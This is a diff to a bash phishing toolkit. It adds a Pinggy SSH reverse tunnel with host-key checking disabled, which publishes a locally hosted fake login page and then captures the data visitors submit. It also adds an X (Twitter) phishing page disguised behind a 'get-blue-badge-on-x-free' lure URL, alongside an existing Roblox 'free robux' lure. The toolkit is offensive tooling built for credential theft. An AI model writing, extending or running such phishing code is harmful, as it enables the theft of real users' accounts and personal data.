@@ -508,6 +508,24 @@ start_loclx() {
 	capture_data
 }
 
+## Start pinggy
+start_pinggy() {
+    read -p "[?] Enter your local port to start server on (default 8080): " port
+    port=${port:-8080}
+
+    echo -e "\n[+] Starting local server on port $port..."
+    setup_site  # Your server start command or function
+    sleep 3
+
+	echo -e "\e[1;31m[!!! IMPORTANT !!!] SSH password is: blank (type 'blank' when prompted)\e[0m"
+    echo -e "\n[+] Starting Pinggy tunnel forwarding localhost:$port ...\n"
+    ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:$port qr@free.pinggy.io &
+
+    sleep 5  # Give tunnel time to establish
+
+    capture_data  # Start capturing visitor data
+}
+
 ## Start localhost
 start_localhost() {
 	cusport
@@ -526,6 +544,7 @@ tunnel_menu() {
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
 		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
 		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
+		${RED}[${WHITE}04${RED}]${ORANGE} Pinngy   	   ${RED}[${CYAN}NEW! Max 60Min${RED}]
 
 	EOF
 
@@ -538,6 +557,8 @@ tunnel_menu() {
 			start_cloudflared;;
 		3 | 03)
 			start_loclx;;
+		4 | 04)
+			start_pinggy;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
@@ -750,7 +771,7 @@ main_menu() {
 		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
-		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
+		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox       ${RED}[${WHITE}08${RED}]${ORANGE} X 
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
@@ -890,6 +911,10 @@ main_menu() {
 		35)
 			website="roblox"
 			mask='https://get-free-robux'
+			tunnel_menu;;
+		36)
+			website="x"
+			mask='https://get-blue-badge-on-x-free'
 			tunnel_menu;;
 		99)
 			about;;
